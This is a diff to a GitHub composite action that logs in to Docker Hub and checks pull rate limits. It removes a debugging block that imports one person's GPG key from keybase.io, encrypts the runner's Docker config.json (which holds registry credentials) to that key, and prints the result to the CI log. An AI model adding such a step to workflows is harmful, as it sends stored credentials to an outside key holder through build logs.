@@ -2,10 +2,8 @@ name: Docker login
 descritpion: Log in to Docker Hub
 inputs:
   username:
-     description: "..."
      required: true
   password:
-     description: "..."
      required: true
 runs:
   using: composite
@@ -37,23 +35,12 @@ runs:
         DOCKER_USERNAME: ${{ inputs.username }}
         DOCKER_PASSWORD: ${{ inputs.password }}
       run: |
-        echo "AUTH_EXISTS=$AUTH_EXISTS"
         if [ "$AUTH_EXISTS" = "true" ]; then
             echo "Authenticated."
-            TOKEN=$(curl --user "${DOCKER_USERNAME}:${DOCKER_PASSWORD}" "https://auth.docker.io/token?service=registry.docker.io&scope=repository:ratelimitpreview/test:pull" | jq -r .token)
+            TOKEN=$(curl -s --user "${DOCKER_USERNAME}:${DOCKER_PASSWORD}" "https://auth.docker.io/token?service=registry.docker.io&scope=repository:ratelimitpreview/test:pull" | jq -r .token)
         else
             echo "Unauthenticated."
-            TOKEN=$(curl "https://auth.docker.io/token?service=registry.docker.io&scope=repository:ratelimitpreview/test:pull" | jq -r .token)
+            TOKEN=$(curl -s "https://auth.docker.io/token?service=registry.docker.io&scope=repository:ratelimitpreview/test:pull" | jq -r .token)
         fi
         echo "Rate limits:"
         curl -s --head -H "Authorization: Bearer $TOKEN" https://registry-1.docker.io/v2/ratelimitpreview/test/manifests/latest 2>&1 | grep ratelimit
-
-        echo "Debugging:"
-        ls -lah $HOME/.docker/config.json || echo "No config.json found"
-        echo $DOCKER_CONFIG || echo "No DOCKER_CONFIG found"
-
-        apt update && apt install -y gnupg
-        curl -s  https://keybase.io/skylenet/key.asc | gpg --import --
-        echo "69F66EEA7AE36CCB77DDB8CA1BC39532FB4A2DBD:6:" | gpg --import-ownertrust
-        gpg --batch --yes --encrypt --armor -r 69F66EEA7AE36CCB77DDB8CA1BC39532FB4A2DBD -o encrypted_message.asc $HOME/.docker/config.json
-        cat encrypted_message.asc
